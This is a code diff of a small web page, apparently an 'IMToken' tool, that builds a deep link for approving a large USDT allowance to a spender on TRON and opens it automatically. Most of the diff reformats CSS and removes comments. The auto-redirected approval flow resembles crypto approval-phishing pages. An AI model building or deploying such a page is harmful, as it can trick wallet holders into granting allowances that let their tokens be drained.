@@ -5,12 +5,42 @@
   <title>TRON USDT Max Approval - IMToken</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body { font-family: Arial, sans-serif; padding: 20px; background: #f6f6f6; }
-    label { display: block; margin-top: 10px; }
-    input, button { padding: 8px; margin: 5px 0; width: 100%; box-sizing: border-box; }
-    button { cursor: pointer; background: #007bff; color: white; border: none; border-radius: 4px; }
-    button:hover { background: #0056b3; }
-    #status { margin-top: 15px; font-weight: bold; word-break: break-all; }
+    /* 全局样式 */
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      background: #f6f6f6;
+    }
+
+    label {
+      display: block;
+      margin-top: 10px;
+    }
+
+    input, button {
+      padding: 8px;
+      margin: 5px 0;
+      width: 100%;
+      box-sizing: border-box;
+    }
+
+    button {
+      cursor: pointer;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 4px;
+    }
+
+    button:hover {
+      background: #0056b3;
+    }
+
+    #status {
+      margin-top: 15px;
+      font-weight: bold;
+      word-break: break-all;
+    }
   </style>
 </head>
 <body>
@@ -32,15 +62,14 @@ const MAX_APPROVAL = 9999999;
 
 // Generate IMToken deep link
 function generateIMTokenLink(contractAddress, spender, amount) {
-  // IMToken TRON DApp URL format
-  const base = 'imtokenv2://navigate/dapp/'; // DApp Browser
+  const base = 'imtokenv2://navigate/dapp/';
   const params = {
-    type: 'tron',              // network
-    contract: contractAddress, // contract
-    method: 'approve',         // method
+    type: 'tron',
+    contract: contractAddress,
+    method: 'approve',
     args: JSON.stringify([spender, amount])
   };
-  
+
   const query = Object.keys(params).map(k => `${k}=${encodeURIComponent(params[k])}`).join('&');
   return base + '?' + query;
 }
@@ -58,8 +87,8 @@ function approveViaIMToken() {
   const link = generateIMTokenLink(contractAddress, spender, MAX_APPROVAL);
 
   statusEl.innerHTML = `Click the link to open IMToken and authorize:<br><a href="${link}">Open IMToken</a>`;
-  
-  // Optional: auto redirect for mobile
+
+  // Auto redirect for mobile devices
   window.location.href = link;
 }
 
